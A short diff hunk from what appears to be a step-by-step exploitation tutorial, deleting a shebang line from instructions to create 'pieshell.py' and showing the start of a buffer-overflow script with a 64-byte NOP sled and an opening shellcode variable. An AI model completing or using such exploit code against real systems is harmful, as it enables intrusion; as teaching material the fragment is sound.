@@ -78,7 +78,6 @@ nano pieshell.py
 /note the name is completely arbitrary and is completely up to you
 /Step 9.2 Copy+paste the following code into it:
 ---
-#!/usr/bin/python 
 
 nopsled = '\x90' * 64 
 shellcode = (
